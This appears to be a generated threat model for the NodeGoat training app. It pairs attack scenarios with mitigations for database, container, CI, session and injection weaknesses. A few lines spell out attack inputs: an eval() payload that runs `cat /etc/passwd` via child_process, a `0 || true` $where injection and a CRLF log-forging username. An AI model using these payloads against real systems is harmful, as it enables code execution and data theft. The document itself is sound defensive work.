threats.likelihoodReason: Requires a read path into the users collection, but such paths exist in this codebase and the data is entirely unprotected once reached. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Encrypt SSN, DOB and bank fields at the field level before writing them.
steps: Re-enable the crypto helpers in app/data/profile-dao.js using crypto.createCipheriv with a per-record random IV stored alongside the ciphertext, not on the shared config object.
Move the key out of config/env/all.js into an environment variable and rotate it.
Encrypt ssn, dob, bankAcc and bankRouting in updateUser and decrypt only in getUser for display.

threats.title: Seed credentials travel to MongoDB over an unauthenticated, unencrypted wire connection
threats.asset: seed user credentials and the plaintext user credential records they create
threats.attackScenario: The seed job connects with the URI from config/env/all.js:3 / docker-compose.yml:8 (`mongodb://mongo:27017/nodegoat`), which carries no username, password or TLS option, so anyone who can reach port 27017 on the mongo container network connects as an unauthenticated client, reads the inserted plaintext password fields and isAdmin flag, or rewrites them to add an attacker-controlled admin user.
assumptions: Encryption at rest is not enabled, so sensitive fields are stored in plaintext given the ProfileDAO encryption code is commented out.
MongoDB has no authentication configured, matching the credential-less connection string in docker-compose.yml.
No TLS is negotiated on the MongoDB wire connection, so the inserted documents are observable to anyone on the container network path.
The MongoDB deployment accepts connections without authentication, as implied by the credential-free connection string used for this flow.
threats.impactReason: Direct database access exposes plaintext passwords, SSN, DOB and bank account/routing numbers and allows insertion of an admin user.
threats.likelihoodReason: Requires a foothold on the network path to the mongo container, but no credential is needed once there. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies; no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Authenticate and encrypt the seed job's MongoDB connection.
steps: Create a dedicated MongoDB user for seeding and put its credentials in the MONGODB_URI used by docker-compose.yml and Heroku, rather than the credential-free mongodb://mongo:27017/nodegoat default in config/env/all.js:3.
Enable MongoDB authorization on the mongo:4.4 service in docker-compose.yml and append tls=true to the connection string so the wire traffic carrying seeded documents is encrypted.
Hash passwords in artifacts/db-reset.js before they are written so an observer on the wire cannot recover usable credentials.

threats.title: Seed job writes fixed, publicly known account passwords in plaintext into the users collection
threats.asset: seed user credentials, including the isAdmin:true admin account
threats.attackScenario: artifacts/db-reset.js:12-37 inserts USERS_TO_INSERT with literal password values and `isAdmin: true` for userName "admin", so after any container start or Heroku postdeploy an attacker logs in at the application login page with the well-known admin credential from this repository file and gains administrative access to every stored user profile.
assumptions: The application authenticates by comparing the submitted password against the value the seed script writes, so the seeded credential is directly usable at login.
The seeded admin account is not disabled or rotated after deployment.
threats.impactReason: A publicly documented admin credential yields full administrative access to SSN, DOB and bank account data held in the application.
threats.likelihoodReason: The credentials are committed in the repository and the seed runs automatically at startup and postdeploy.

mitigation.summary: Stop seeding fixed credentials; generate them at run time and store only hashes.
steps: Replace the literal password fields in artifacts/db-reset.js:12-37 with values read from environment variables or randomly generated at run time and printed once.
Hash the seeded passwords with the bcrypt-nodejs dependency already in package.json before inserting them into the users collection.
Restrict seeding of the isAdmin account to non-production environments.

threats.title: Seed job's drop-and-insert flow can be replayed against the live database to erase collections
threats.asset: the nodegoat users, allocations and memos collections
threats.attackScenario: Because the seed-to-mongo connection uses the credential-free `mongodb://mongo:27017/nodegoat` URI from docker-compose.yml:8, an attacker on the container network replays the same dropCollection operations artifacts/db-reset.js performs, deleting the users and allocations collections and taking the application offline until it is reseeded with the known default accounts.
assumptions: MongoDB has no authentication configured, matching the credential-less connection string in docker-compose.yml.
The MongoDB instance reachable at mongo:27017 does not require authentication or role-based restrictions on dropCollection.
threats.impactReason: Dropping the collections removes all persisted user and retirement data and halts application function.
threats.likelihoodReason: Trivial once network access to the mongo container exists; no credential or exploit is required. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Require authenticated, least-privilege access for all MongoDB connections and isolate the database port.
steps: Enable authorization on the mongo service in docker-compose.yml and grant the application user readWrite without dropDatabase/dropCollection rights.
Give the seed script a separate higher-privilege credential supplied only when an explicit reset is intended.
Keep 27017 unpublished and restricted to the compose network, as docker-compose.yml already does with `expose`, and verify no host port mapping is added.

threats.title: Seed script drops all collections on every container start and Heroku postdeploy, destroying live user data
threats.asset: stored user records (accounts, allocations, contributions, memos) in the nodegoat MongoDB database
threats.attackScenario: artifacts/db-reset.js calls tryDropCollection to drop the nodegoat collections and reinsert three fixed users, and it is wired to run unconditionally as the Heroku "postdeploy" script (app.json:13) and in the docker-compose web command before npm start (docker-compose.yml:9), so anyone who can trigger a redeploy or a container restart wipes every real user document and replaces the user set with admin/user1/user2.
assumptions: No guard checks NODE_ENV or an existing-data marker before dropCollection runs.
The deployment described by app.json and docker-compose.yml is used for a non-throwaway environment where user documents matter.
threats.impactReason: All existing collection contents are dropped, an irreversible loss of user and retirement data.
threats.likelihoodReason: No attacker skill is needed: any restart or redeploy triggers it, and restarts are routine.

mitigation.summary: Make the reset script opt-in and refuse to run against a populated or production database.
steps: In artifacts/db-reset.js, abort with a non-zero exit unless an explicit env flag such as ALLOW_DB_RESET=true is set and NODE_ENV is not "production".
Remove `node artifacts/db-reset.js &&` from the web service command in docker-compose.yml and run it as a one-off developer command instead.
Drop the "postdeploy" entry in app.json or point it at an idempotent migration that only inserts when the users collection is empty.

threats.title: Seed job leaves no attributable record of who reset the database
threats.asset: audit trail for destructive changes to the nodegoat collections
threats.attackScenario: artifacts/db-reset.js only console.logs "Dropped collection: <name>" to stdout with no actor, timestamp or environment recorded, so an operator who triggers a Heroku redeploy (app.json postdeploy) to wipe user records and reinstate the known admin account can deny having done it, and there is no server-side evidence linking the destruction of the users collection to any principal.
assumptions: Container stdout is not shipped to a tamper-resistant, retained log store that records who initiated the deploy or restart.
threats.impactReason: Destruction of user records and reinstatement of a known admin account cannot be attributed or investigated.
threats.likelihoodReason: Every run of the script is unattributed by design; no attacker effort is required to benefit from it.

mitigation.summary: Emit an attributable audit record for each reset run.
steps: In artifacts/db-reset.js, write a document to an audit collection recording timestamp, NODE_ENV, hostname and the invoking user/deploy id before dropping collections.
Forward container stdout from the web service in docker-compose.yml to a retained log sink outside the container.

threats.title: MongoDB service in compose runs with no authentication, allowing any container on the network to read or modify the nodegoat database
threats.asset: the nodegoat MongoDB database contents (user accounts, allocations, memos)
threats.attackScenario: The mongo service at docker-compose.yml:13 is started from the stock mongo:4.4 image with no MONGO_INITDB_ROOT_USERNAME/PASSWORD and the web service connects with the credential-free URI mongodb://mongo:27017/nodegoat (docker-compose.yml:8), so an attacker who obtains any foothold on the compose network (for example through the web container) connects to mongo:27017 with mongosh, authenticates as nobody, and dumps or rewrites the users collection including password hashes.
assumptions: The compose default bridge network is shared with other containers that an attacker could reach or compromise.
The mongo container is deployed as written in docker-compose.yml, with no authentication enabled by an external config file or command override.
threats.impactReason: Unauthenticated database access exposes and allows modification of every document in the nodegoat database, including stored credentials.
threats.likelihoodReason: The port is only exposed on the internal compose network, so an attacker first needs a foothold in another container or on the docker network, but no credential is then required.

mitigation.summary: Enable authentication on the mongo compose service and give the web service scoped credentials.
steps: Set MONGO_INITDB_ROOT_USERNAME and MONGO_INITDB_ROOT_PASSWORD on the mongo service in docker-compose.yml and source them from a .env file or docker secret.
Create a least-privilege application user for the nodegoat database and change MONGODB_URI at docker-compose.yml:8 to include those credentials plus authSource.
Start mongod with --auth (or a mongod.conf with security.authorization: enabled) so unauthenticated connections are rejected.

threats.title: MongoDB traffic between the web and mongo compose services is unencrypted
threats.asset: nodegoat database records in transit (user documents, session and allocation data)
threats.attackScenario: The mongo service at docker-compose.yml:13 exposes port 27017 with no TLS options and the connection string mongodb://mongo:27017/nodegoat carries no tls=true, so an attacker with packet-capture ability on the compose bridge network (for example a compromised sidecar container running tcpdump) reads or rewrites query results such as user documents as they travel between web and mongo.
assumptions: An attacker can reach the shared docker bridge network used by the compose project.
No TLS is configured for mongod outside docker-compose.yml, so wire traffic is plaintext BSON.
threats.impactReason: Captured traffic reveals database records including credential material, but only what is actually queried during the capture window.
threats.likelihoodReason: Requires an existing privileged position on the docker host or network namespace rather than remote access.

mitigation.summary: Terminate MongoDB connections over TLS.
steps: Mount a certificate and start mongod with net.tls.mode requireTLS in the mongo service definition in docker-compose.yml.
Append tls=true and the CA file option to MONGODB_URI at docker-compose.yml:8.
Place mongo on a dedicated internal compose network so only the web service can reach port 27017.

threats.title: Web compose service publishes port 4000 on all host interfaces with no resource limits or restart policy
threats.asset: availability of the nodegoat web application
threats.attackScenario: The web service at docker-compose.yml:4 maps "4000:4000" without binding to 127.0.0.1 and sets no cpus/mem_limit, so an attacker who can reach the docker host on TCP 4000 floods the application with concurrent requests, exhausts the container's unbounded CPU and memory share, and takes the nodegoat application offline for all users.
assumptions: No deploy resource constraints are applied by an override file.
The compose stack is run on a host whose port 4000 is reachable from an untrusted network, with no reverse proxy or rate limiter in front of it.
threats.impactReason: Loss of availability of the application; no data confidentiality or integrity impact on its own.
threats.likelihoodReason: The published host port is directly reachable and no authentication is needed to send traffic to it.

mitigation.summary: Restrict the published port and constrain container resources.
steps: Change the port mapping at docker-compose.yml:10-11 to "127.0.0.1:4000:4000" and front the app with a reverse proxy that enforces TLS and rate limits.
Add mem_limit and cpus (or a deploy.resources.limits block) to the web service so a request flood cannot exhaust the host.
Add restart: on-failure so the container recovers after a crash.

threats.title: Web compose service runs as root with a build-from-source image and no read-only filesystem
threats.asset: integrity of the running nodegoat application code and container filesystem
threats.attackScenario: Unlike the mongo service, which pins user: mongodb at docker-compose.yml:15, the web service at docker-compose.yml:4 declares no user, no read_only and no cap_drop, so an attacker who achieves code execution through the application writes to application files under the container root, patches artifacts/db-reset.js or npm start entrypoints referenced at docker-compose.yml:9, and persists across container restarts of the built image.
assumptions: The Dockerfile used by `build: .` does not itself drop to a non-root USER.
The attacker has already obtained command or file-write execution inside the web container through an application flaw.
threats.impactReason: Root inside the container allows tampering with all application code and increases the blast radius of any container escape.
threats.likelihoodReason: Requires a prior application-level compromise before the missing hardening becomes exploitable.

mitigation.summary: Run the web container as a non-root user with a read-only root filesystem.
steps: Add a non-root USER to the Dockerfile and set user: on the web service in docker-compose.yml, mirroring the mongo service at line 15.
Add read_only: true plus explicit tmpfs mounts for any writable paths the app needs.
Add cap_drop: [ALL] and security_opt: [no-new-privileges:true] to the web service.

threats.title: Container image ships the full source tree and build context with world-readable permissions hardening commented out
threats.asset: application source code and any credential files copied in from the build context
threats.attackScenario: Line 13 of Dockerfile does `COPY --chown=node . $WORKDIR`, copying the entire build context (including any .env, key or config file not excluded by .dockerignore) into the image, while the `chmod -R g-s,o-rx` hardening on line 15 is left commented out, so anyone who pulls the image or obtains a shell in the container as another uid can read the copied files and, because the app directory is owned by the same `node` user that runs the process, overwrite application JavaScript to persist code.
assumptions: No .dockerignore excludes environment or credential files from the build context.
The published image is accessible to parties who should not see the full source tree or its secrets.
threats.impactReason: Leaked build-context secrets and writable application code allow credential reuse and persistence inside the container.
threats.likelihoodReason: Requires image access or a foothold in the container, but the permissive layout is the default state of the file as written.

mitigation.summary: Restrict what is copied into the image and apply the permission hardening for all environments.
steps: Add a .dockerignore excluding .env, .git, test fixtures, local credentials and node_modules from the build context.
Copy only the built artefacts and package files instead of `COPY . $WORKDIR` at Dockerfile:13.
Uncomment and apply the chmod/chown hardening currently disabled at Dockerfile:15 so application files are not writable by the runtime user.

threats.title: Dockerfile builds on end-of-life node:12-alpine base image with unpinned digest
threats.asset: the running application container and the code and environment it holds
threats.attackScenario: The image at Dockerfile:1 and :7 is built from the floating tag node:12-alpine, a Node.js release that no longer receives security patches, so an attacker who finds an unfixed CVE in the bundled Node runtime or Alpine userland (or who poisons the mutable tag in the registry) gets remote code execution inside the container exposed on port 4000.
assumptions: The Dockerfile in the repository is what is actually built and deployed for the service listening on port 4000.
threats.impactReason: Compromise of the base layer gives code execution in the application container and access to any secrets mounted into it.
threats.likelihoodReason: Node 12 is past end-of-life so public unpatched CVEs accumulate, but exploitation still needs a reachable vulnerable code path.

mitigation.summary: Move to a supported Node LTS base image and pin it by digest.
steps: Replace `FROM node:12-alpine` on lines 1 and 7 of Dockerfile with a currently supported LTS tag, e.g. node:20-alpine.
Pin the base image by digest (`FROM node:20-alpine@sha256:...`) so the tag cannot be silently re-pointed.
Add a container image scan step to the existing GitHub Actions workflows to fail builds on known base-image CVEs.

threats.title: E2E workflow triggers on pull_request with unpinned third-party actions, allowing supply-chain tampering of CI runs
threats.asset: the CI runner and the build/test artefacts it produces for the repository
threats.attackScenario: The e2e-test job at .github/workflows/e2e-test.yml:5 references actions/checkout@v2, actions/setup-node@v1 and actions/cache@v2 by mutable tag rather than commit SHA, so an attacker who compromises one of those action repositories (or the tag) can push code that executes in every push and pull_request run of this job and tamper with the checked-out tree or the npm cache restored at lines 25-31 before `npm ci` runs.
assumptions: The workflow runs on the project's own GitHub-hosted runners with the default GITHUB_TOKEN available to steps.
threats.impactReason: Code executing in the CI job can alter test results and tamper with the repository checkout and dependency cache used to validate releases.
threats.likelihoodReason: Requires compromise of a widely watched upstream action or its tag; the workflow already sets persist-credentials: false, limiting token theft.

mitigation.summary: Pin GitHub Actions to immutable commit SHAs and scope workflow permissions.
steps: Replace actions/checkout@v2, actions/setup-node@v1 and actions/cache@v2 in .github/workflows/e2e-test.yml with full commit SHAs plus a version comment.
Add an explicit `permissions: contents: read` block to the e2e-test job so the GITHUB_TOKEN is read-only.
Enable Dependabot updates for GitHub Actions so pinned SHAs are refreshed deliberately.

threats.title: Shared npm/cache restored across untrusted pull-request runs can poison the e2e test job
threats.asset: integrity of the dependencies installed by `npm ci` during CI verification
threats.attackScenario: The workflow at .github/workflows/e2e-test.yml runs on every `pull_request` (line 2) and restores ~/.npm and ~/.cache with a key derived only from the OS, node version and package-lock hash (lines 25-31), so a contributor opening a pull request that changes nothing in package-lock.json can have their branch's job write tampered tarballs into that cache entry, which later runs of the same key then feed to `npm ci` at line 35.
assumptions: Cache entries written by pull-request branch runs are readable by subsequent runs sharing the same cache key scope.
threats.impactReason: Poisoned cached packages execute install scripts and test code in CI, affecting the trustworthiness of test results for the whole repository.
threats.likelihoodReason: Anyone can open a pull request, but GitHub's cache scoping restricts cross-branch writes, so the window is narrow.

mitigation.summary: Do not share dependency caches between untrusted pull-request runs and trusted branches.
steps: Include `${{ github.ref }}` or a trusted-branch-only condition in the cache key at .github/workflows/e2e-test.yml:31, or skip the cache step for pull_request events.
Rely on `npm ci` with `--ignore-scripts` where possible so cached packages cannot execute install hooks.
Consider actions/setup-node's built-in cache with lockfile-scoped keys instead of caching ~/.cache wholesale.

threats.title: Lint workflow runs on pull_request with an unpinned npx-fetched linter, allowing supply-chain tampering of CI execution
threats.asset: integrity of the CI build runner for the NodeGoat repository
threats.attackScenario: The lint job at .github/workflows/lint.yml:5 runs `npx --no-install jshint@2.12.0 .` at line 26 and uses floating action references actions/checkout@v2 and actions/setup-node@v1 (lines 16 and 21); an attacker who compromises the jshint 2.12.0 tarball or the mutable v1/v2 action tags gets arbitrary code executed on the ubuntu-latest runner on every push and pull_request, including pull requests opened by outside contributors.
assumptions: Action tags v1/v2 and the npm registry entry for jshint@2.12.0 are mutable and not verified by digest or lockfile.
The repository accepts pull requests from forks, so the workflow is triggered by code the maintainers have not reviewed.
threats.impactReason: Code execution on the CI runner can poison build artifacts or probe the runner environment, though persist-credentials:false limits direct token reuse from checkout.
threats.likelihoodReason: Requires compromising an upstream npm package or a GitHub action tag, which is not trivial but is a demonstrated attack path for unpinned CI dependencies.

mitigation.summary: Pin CI actions and the linter to immutable versions.
steps: Replace actions/checkout@v2 and actions/setup-node@v1 at .github/workflows/lint.yml:16 and :21 with full commit SHA references.
Install jshint from the repository package-lock.json via `npm ci` and run it from node_modules instead of fetching it with npx at line 26.
Add an explicit minimal `permissions:` block to the lint job so the GITHUB_TOKEN is read-only.

threats.title: Session cookie for RetireEasy users is transmitted over plaintext HTTP and lacks httpOnly/secure flags, enabling account spoofing
threats.asset: session cookie of the logged-in RetireEasy user
threats.attackScenario: server.js:145 starts the app with http.createServer and leaves the express-session cookie options block commented out (server.js:92-100), so an attacker on the same network as the End User captures the connect.sid cookie sent on GET /login and POST /login (app/routes/index.js:33-34) and replays it to impersonate that user's session and read their profile SSN and bank account at /profile.
assumptions: No TLS-terminating proxy is placed in front of the Node process in the deployed environment.
TLS is not terminated anywhere in front of the app, so credentials and cookies travel over plain HTTP as server.js configures.
threats.impactReason: A stolen session cookie gives full access to the victim's retirement profile including SSN, DOB and bank routing number.
threats.likelihoodReason: Passive capture on a shared or hostile network needs no credentials, and the cookie is sent on every request. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Serve the application over HTTPS and harden the session cookie flags.
steps: Uncomment the https.createServer block in server.js:149-155 and terminate TLS, or place the app behind a TLS proxy and set app.set('trust proxy', 1).
Uncomment and enable the session cookie options in server.js:92-100 with httpOnly: true, secure: true, sameSite: 'lax' and a maxAge.
Rename the session cookie to a generic key as the commented block at server.js:86-90 suggests.

threats.title: Login attempts by the End User are not attributable because the only record is an unsanitised console.log
threats.asset: authentication audit trail for user accounts
threats.attackScenario: POST /login (app/routes/index.js:34) records nothing on success and only writes console.log("Error: attempt to login with invalid user: ", userName) on failure in app/routes/session.js:64, so an attacker brute-forcing an account submits a userName containing CRLF such as "victim\n[info] login ok" to forge log lines and leaves no reliable record tying the successful session to their IP, letting them deny the profile changes they then make.
assumptions: No external access log or SIEM captures authentication events for this deployment.
threats.impactReason: Account takeover and profile edits (SSN, bank account) cannot be attributed or disputed after the fact.
threats.likelihoodReason: Any unauthenticated visitor reaches POST /login and controls the userName field that is logged verbatim.

mitigation.summary: Emit structured, sanitised authentication audit events for both success and failure.
steps: Replace the raw console.log in app/routes/session.js:64 with an encoded value using the already-present node-esapi encoder, as the commented example at session.js:72-77 shows.
Log successful logins with user id, timestamp and source IP, not just failures.
Ship these events to a durable, append-only log store rather than stdout only.

threats.title: MongoDB reachable without authentication using the default connection URI
threats.asset: user credentials stored in plaintext, SSN, DOB and bank account/routing numbers in the nodegoat collections
threats.attackScenario: config/env/all.js:3 and docker-compose.yml:8 supply a connection string with no username, password or TLS options, so an attacker who reaches port 27017 (for example from another container on the compose network, or from the host when the `docker-mongo` script in package.json publishes 27017) connects with the mongo shell and dumps or drops the users collection containing plaintext passwords and bank details.
assumptions: Encryption at rest is not enabled, so sensitive fields are stored in plaintext given the ProfileDAO encryption code is commented out.
MongoDB has no authentication configured, matching the credential-less connection string in docker-compose.yml.
Network access to port 27017 is obtainable by an attacker from the container network or the host.
The mongod instance is started without --auth, so the credential-free URI in config/env/all.js reflects an unauthenticated server.
threats.impactReason: Direct database access exposes and allows modification of every collection, including plaintext credentials and bank account numbers, with no application-level checks.
threats.likelihoodReason: Requires network reach to 27017; the compose file only exposes it internally, but the npm docker-mongo script publishes it to the host. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies; no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Enable MongoDB authentication and TLS, and supply credentials through MONGODB_URI.
steps: Start mongo:4.4 in docker-compose.yml with `--auth` and create a least-privilege application user for the nodegoat database.
Set MONGODB_URI in docker-compose.yml to include those credentials and `tls=true`, and remove the credential-free default in config/env/all.js:3.
Bind mongod to the internal network only and never publish 27017 to the host.

threats.title: NoSQL $where JavaScript injection into the allocations collection
threats.asset: allocations, contributions and user records in the nodegoat MongoDB database
threats.attackScenario: app/data/allocations-dao.js:77 builds a MongoDB $where clause by interpolating a request-controlled value into JavaScript source, so an attacker calls the allocations route with a threshold value such as `0 || true` (or a sleep/infinite loop expression) and makes the database evaluate attacker-supplied JavaScript, returning every allocation row or pinning the mongod JavaScript engine.
assumptions: The interpolated value in the $where clause originates from an HTTP request parameter rather than a server-side constant.
threats.impactReason: Server-side JavaScript executed by mongod can read or return every document in the nodegoat database, including SSN, DOB and bank account numbers, and can hang the server.
threats.likelihoodReason: The injection point is reachable through a normal application route with a simple query/body value; no special position is needed.

mitigation.summary: Replace the $where clause with typed query operators.
steps: Rewrite the query at app/data/allocations-dao.js:77 to use `{ threshold: { $gt: value } }` style operators instead of a $where JavaScript string.
Coerce the incoming value with parseInt/Number and reject NaN before it reaches the DAO.
Disable server-side JavaScript on the mongod instance (--noscripting) so $where cannot be evaluated at all.

threats.title: No audit trail of database writes to allocations, benefits and memos
threats.asset: integrity record of retirement allocations, benefits and memo documents
threats.attackScenario: The nodegoat MongoDB instance is started from docker-compose.yml:13 with no auditing or per-application database user, so an attacker who obtains any path to the database (for example via the $where injection at app/data/allocations-dao.js:77) updates another user's benefits or allocations documents and no server-side record attributes the change to any identity.
assumptions: MongoDB has no authentication configured, matching the credential-less connection string in docker-compose.yml.
mongod is run without auditing enabled and the application uses a single shared connection with no per-user identity, so writes cannot be attributed.
threats.impactReason: Tampered benefits or allocation records cannot be distinguished from legitimate updates or traced to an actor during incident response.
threats.likelihoodReason: Any injection or direct-connection path to the database yields unattributable writes; no additional control has to be defeated. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Enable MongoDB auditing and application-level change logging for sensitive collections.
steps: Run mongod in docker-compose.yml with auditing enabled (auditLog destination and filter on the nodegoat database) and distinct database users per role.
Write an append-only change record (actor user id, collection, document id, timestamp) in the DAO layer for every update to allocations, benefits and memos.
Ship those records off-host so a database compromise cannot erase them.

threats.title: Denial of service through the vulnerable mongodb 2.2.36 driver
threats.asset: availability of the nodegoat database connection and the data it serves
threats.attackScenario: package.json:18 pins mongodb@^2.1.18, resolving to 2.2.36, which is affected by GHSA-mh5c-679w-hh4r; an attacker sends request data that reaches the driver's BSON handling through a route such as /allocations/:userId and crashes or hangs the single MongoClient connection established in server.js:30, taking the application offline.
assumptions: The deployed lockfile resolves to the affected 2.2.36 version rather than a patched 3.1.13+ release.
threats.impactReason: The application holds one database connection created at startup, so a driver-level crash makes all data unavailable until restart.
threats.likelihoodReason: A published advisory exists for the pinned version and the driver processes attacker-influenced values on every authenticated route.

mitigation.summary: Upgrade the mongodb driver past the advisory's fixed version.
steps: Raise the mongodb dependency in package.json:18 to at least 3.1.13 (preferably a current 4.x/5.x line) and update the MongoClient.connect usage in server.js:30 to the new callback/promise API.
Add an audit step (npm audit / OSV scanning) to the CI scripts in package.json so new advisories fail the build.

threats.title: Cross-site request forgery on POST /profile, /contributions, /benefits and /memos
threats.asset: retirement contribution percentages and profile data (SSN, bank account, routing number)
threats.attackScenario: An attacker hosts a page that auto-submits a hidden form to https://nodegoat.example/profile with attacker-chosen bankAcc and bankRouting values; because server.js leaves csrf() commented out at lines 104-113 and express-session sends the cookie on the cross-site POST, the victim's own profile is silently rewritten with the attacker's bank details.
assumptions: No reverse proxy or SameSite cookie default blocks cross-site form POSTs to these routes.
threats.impactReason: Payroll bank details and contribution allocations can be rewritten on behalf of any logged-in employee.
threats.likelihoodReason: Requires luring an authenticated user to a page, but the forms need no unpredictable value.

mitigation.summary: Enable the already-installed csurf middleware and emit tokens in every form.
steps: Uncomment the csrf() registration and res.locals.csrftoken middleware at server.js:104-113 (csurf is already in package.json).
Add a hidden _csrf input to app/views/profile.html and the contributions, benefits and memos forms.
Set cookie: { httpOnly: true, sameSite: 'lax' } on the express-session config in server.js.

threats.title: Server-side JavaScript injection via eval() on POST /contributions
threats.asset: the NodeGoat Express server process and all MongoDB data it can reach (credentials, profiles, allocations)
threats.attackScenario: An attacker logs in as any user and posts to /contributions with preTax=require('child_process').execSync('cat /etc/passwd').toString() — app/routes/contributions.js:32-34 passes req.body.preTax, afterTax and roth straight to eval(), executing the attacker's code inside the Node process and giving shell-level access to the server and the Mongo connection.
threats.impactReason: Arbitrary code execution in the application process exposes every database record, the cookie secret and the host itself.
threats.likelihoodReason: Any self-registered, logged-in user can reach POST /contributions and the payload is a plain form field.

mitigation.summary: Replace eval() with numeric parsing for contribution fields.
steps: In app/routes/contributions.js lines 32-34 use parseInt(req.body.preTax, 10) (the commented-out fix at lines 38-40) instead of eval().
Reject non-numeric or out-of-range values before persisting via ContributionsDAO.
Add an integration test posting a JavaScript expression to /contributions and assert it is rejected.
